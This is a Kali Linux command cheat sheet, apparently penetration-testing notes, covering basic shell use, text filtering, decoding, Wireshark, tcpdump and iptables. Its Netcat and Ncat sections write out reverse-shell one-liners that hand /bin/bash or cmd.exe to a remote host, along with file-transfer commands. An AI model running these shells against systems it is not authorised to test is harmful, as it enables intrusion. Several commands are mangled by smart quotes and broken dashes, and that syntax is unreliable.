<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <title>kali-linux</title>
  <style>
    html {
      line-height: 1.5;
      font-family: Georgia, serif;
      font-size: 20px;
      color: #1a1a1a;
      background-color: #fdfdfd;
    }
    body {
      margin: 0 auto;
      max-width: 36em;
      padding-left: 50px;
      padding-right: 50px;
      padding-top: 50px;
      padding-bottom: 50px;
      hyphens: auto;
      overflow-wrap: break-word;
      text-rendering: optimizeLegibility;
      font-kerning: normal;
    }
    @media (max-width: 600px) {
      body {
        font-size: 0.9em;
        padding: 1em;
      }
    }
    @media print {
      body {
        background-color: transparent;
        color: black;
        font-size: 12pt;
      }
      p, h2, h3 {
        orphans: 3;
        widows: 3;
      }
      h2, h3, h4 {
        page-break-after: avoid;
      }
    }
    p {
      margin: 1em 0;
    }
    a {
      color: #1a1a1a;
    }
    a:visited {
      color: #1a1a1a;
    }
    img {
      max-width: 100%;
    }
    h1, h2, h3, h4, h5, h6 {
      margin-top: 1.4em;
    }
    h5, h6 {
      font-size: 1em;
      font-style: italic;
    }
    h6 {
      font-weight: normal;
    }
    ol, ul {
      padding-left: 1.7em;
      margin-top: 1em;
    }
    li > ol, li > ul {
      margin-top: 0;
    }
    blockquote {
      margin: 1em 0 1em 1.7em;
      padding-left: 1em;
      border-left: 2px solid #e6e6e6;
      color: #606060;
    }
    code {
      font-family: Menlo, Monaco, 'Lucida Console', Consolas, monospace;
      font-size: 85%;
      margin: 0;
    }
    pre {
      margin: 1em 0;
      overflow: auto;
    }
    pre code {
      padding: 0;
      overflow: visible;
      overflow-wrap: normal;
    }
    .sourceCode {
     background-color: transparent;
     overflow: visible;
    }
    hr {
      background-color: #1a1a1a;
      border: none;
      height: 1px;
      margin: 1em 0;
    }
    table {
      margin: 1em 0;
      border-collapse: collapse;
      width: 100%;
      overflow-x: auto;
      display: block;
      font-variant-numeric: lining-nums tabular-nums;
    }
    table caption {
      margin-bottom: 0.75em;
    }
    tbody {
      margin-top: 0.5em;
      border-top: 1px solid #1a1a1a;
      border-bottom: 1px solid #1a1a1a;
    }
    th {
      border-top: 1px solid #1a1a1a;
      padding: 0.25em 0.5em 0.25em 0.5em;
    }
    td {
      padding: 0.125em 0.5em 0.25em 0.5em;
    }
    header {
      margin-bottom: 4em;
      text-align: center;
    }
    #TOC li {
      list-style: none;
    }
    #TOC a:not(:hover) {
      text-decoration: none;
    }
    code{white-space: pre-wrap;}
    span.smallcaps{font-variant: small-caps;}
    span.underline{text-decoration: underline;}
    div.column{display: inline-block; vertical-align: top; width: 50%;}
    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
    ul.task-list{list-style: none;}
    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
  </style>
  <!--[if lt IE 9]>
    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
  <![endif]-->
</head>
<body>
<h1 id="kali-linux">Kali Linux</h1>
<p>Set the Target IP Address to the <code>$ip</code> system variable<br />
&gt;export ip=192.168.1.100</p>
<p>Find the location of a file<br />
&gt;locate shell.exe</p>
<p>Search through directories in the <code>$PATH</code> environment variable<br />
&gt;which sbd</p>
<p>Find a search for a file that contains a specific string in it’s name:<br />
&gt;find / -name sbd*</p>
<p>Show active internet connections<br />
&gt;netstat -lntp</p>
<p>Change Password<br />
&gt;passwd</p>
<p>Verify a service is running and listening<br />
&gt;netstat -antp |grep apache</p>
<p>Start a service<br />
&gt;systemctl start ssh &gt; &gt;systemctl start apache2</p>
<p>Have a service start at boot<br />
&gt;systemctl enable ssh</p>
<p>Stop a service &gt;systemctl stop ssh</p>
<p>Unzip a gz file<br />
&gt;gunzip access.log.gz</p>
<p>Unzip a tar.gz file<br />
&gt;tar -xzvf file.tar.gz</p>
<p>Search command history<br />
&gt;history | grep phrase_to_search_for</p>
<p>Download a webpage &gt;wget http://www.cisco.com</p>
<p>Open a webpage &gt;curl http://www.cisco.com</p>
<h3 id="string-manipulation">String manipulation</h3>
<p>Count number of lines in file<br />
&gt;wc index.html</p>
<p>Get the start or end of a file<br />
&gt;head index.html &gt; &gt;tail index.html</p>
<p>Extract all the lines that contain a string<br />
&gt;grep “href=” index.html</p>
<p>Cut a string by a delimiter, filter results then sort<br />
&gt;grep “href=” index.html | cut -d “/” -f 3 | grep “\.” | cut -d ‘“’ -f 1 | sort -u</p>
<p>Using Grep and regular expressions and output to a file<br />
&gt;cat index.html | grep -o ’http://[^“]*’ | cut -d”/” -f 3 | sort -u &gt; list.txt</p>
<p>Use a bash loop to find the IP address behind each host<br />
&gt;for url in $(cat list.txt); do host $url; done</p>
<p>Collect all the IP Addresses from a log file and sort by frequency<br />
&gt;cat access.log | cut -d ” ” -f 1 | sort | uniq -c | sort -urn</p>
<h3 id="decoding-using-kali">Decoding using Kali</h3>
<p>Decode Base64 Encoded Values &gt;echo -n “QWxhZGRpbjpvcGVuIHNlc2FtZQ==” | base64 –decode</p>
<p>Decode Hexidecimal Encoded Values &gt;echo -n “46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874” | xxd -r -ps</p>
<h3 id="netcat---read-and-write-tcp-and-udp-packets">Netcat - Read and write TCP and UDP Packets</h3>
<p>Download Netcat for Windows (handy for creating reverse shells and transferring files on windows systems): <a href="https://joncraton.org/blog/46/netcat-for-windows/">https://joncraton.org/blog/46/netcat-for-windows/</a></p>
<p>Connect to a POP3 mail server<br />
&gt;nc -nv $ip 110</p>
<p>Listen on TCP/UDP port<br />
&gt;nc -nlvp 4444</p>
<p>Connect to a netcat port<br />
&gt;nc -nv $ip 4444</p>
<p>Send a file using netcat<br />
&gt;nc -nv $ip 4444 &lt; /usr/share/windows-binaries/wget.exe</p>
<p>Receive a file using netcat<br />
&gt;nc -nlvp 4444 &gt; incoming.exe</p>
<p>Some OSs (OpenBSD) will use nc.traditional rather than nc so watch out for that…</p>
<blockquote>
<p>whereis nc</p>
<p>nc: /bin/nc.traditional /usr/share/man/man1/nc.1.gz</p>
<p>/bin/nc.traditional -e /bin/bash 1.2.3.4 4444</p>
</blockquote>
<p>Create a reverse shell with Ncat using cmd.exe on Windows<br />
&gt;nc.exe -nlvp 4444 -e cmd.exe &gt; &gt;or &gt; &gt;nc.exe -nv ‘Remote IP’ ‘Remote Port’ -e cmd.exe</p>
<p>Create a reverse shell with Ncat using bash on Linux<br />
&gt;nc -nv $ip 4444 -e /bin/bash</p>
<p>Netcat for Banner Grabbing:</p>
<blockquote>
<p>echo “” | nc -nv -w1 IP “Address” “Ports”</p>
</blockquote>
<h3 id="ncat">Ncat</h3>
<p>Netcat for Nmap project which provides more security avoid IDS</p>
<p>Reverse shell from windows using cmd.exe using ssl<br />
&gt;ncat –exec cmd.exe –allow $ip -vnl 4444 –ssl</p>
<p>Listen on port 4444 using ssl &gt;ncat -v $ip 4444 –ssl</p>
<h3 id="wireshark">Wireshark</h3>
<p>Show only SMTP (port 25) and ICMP traffic:</p>
<blockquote>
<p>tcp.port eq 25 or icmp</p>
</blockquote>
<p>Show only traffic in the LAN (192.168.x.x), between workstations and servers – no Internet:</p>
<blockquote>
<p>ip.src==192.168.0.0/16 and ip.dst==192.168.0.0/16</p>
</blockquote>
<p>Filter by a protocol ( e.g. SIP ) and filter out unwanted IPs:</p>
<blockquote>
<p>ip.src != xxx.xxx.xxx.xxx &amp;&amp; ip.dst != xxx.xxx.xxx.xxx &amp;&amp; sip</p>
</blockquote>
<p>Some commands are equal</p>
<blockquote>
<p>ip.addr == xxx.xxx.xxx.xxx</p>
</blockquote>
<p>Equals</p>
<blockquote>
<p>ip.src == xxx.xxx.xxx.xxx or ip.dst == xxx.xxx.xxx.xxx</p>
<p>ip.addr != xxx.xxx.xxx.xxx`</p>
<p>ip.src != xxx.xxx.xxx.xxx or ip.dst != xxx.xxx.xxx.xxx</p>
</blockquote>
<h3 id="tcpdump">Tcpdump</h3>
<p>Display a pcap file<br />
&gt;tcpdump -r passwordz.pcap</p>
<p>Display ips and filter and sort<br />
&gt;tcpdump -n -r passwordz.pcap | awk -F” ” ‘{print $3}’ | sort -u | head</p>
<p>Grab a packet capture on port 80<br />
&gt;tcpdump tcp port 80 -w output.pcap -i eth0</p>
<p>Check for ACK or PSH flag set in a TCP packet<br />
&gt;tcpdump -A -n ‘tcp[13] = 24’ -r passwordz.pcap</p>
<h3 id="iptables">IPTables</h3>
<p>Deny traffic to ports except for Local Loopback</p>
<blockquote>
<p>iptables -A INPUT -p tcp –destination-port 13327 ! -d $ip -j DROP</p>
<p>iptables -A INPUT -p tcp –destination-port 9991 ! -d $ip -j DROP</p>
</blockquote>
<p>Clear ALL IPTables firewall rules</p>
<blockquote>
<p>iptables -P INPUT ACCEPT</p>
<p>iptables -P FORWARD ACCEPT</p>
<p>iptables -P OUTPUT ACCEPT</p>
<p>iptables -t nat -F</p>
<p>iptables -t mangle -F</p>
<p>iptables -F</p>
<p>iptables -X</p>
<p>iptables -t raw -F iptables -t raw -X</p>
</blockquote>
</body>
</html>
